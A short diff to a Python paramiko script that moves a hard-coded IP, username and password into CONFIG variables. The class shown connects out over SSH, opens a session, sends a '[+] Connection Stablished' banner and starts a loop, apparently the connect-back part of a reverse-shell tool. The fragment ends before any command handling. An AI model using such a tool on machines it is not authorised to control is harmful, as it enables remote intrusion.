@@ -3,11 +3,15 @@ import paramiko
 import threading
 import subprocess
 
+# CONFIG 
+IP = ""
+USERNAME = ""
+PASSWORD = ""
 
 class SSH():
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('<IP>', username='user', password='pass')
+    client.connect(IP, username=USERNAME, password=PASSWORD)
     chan = client.get_transport().open_session()
     chan.send('[+] Connection Stablished ')
     while True:
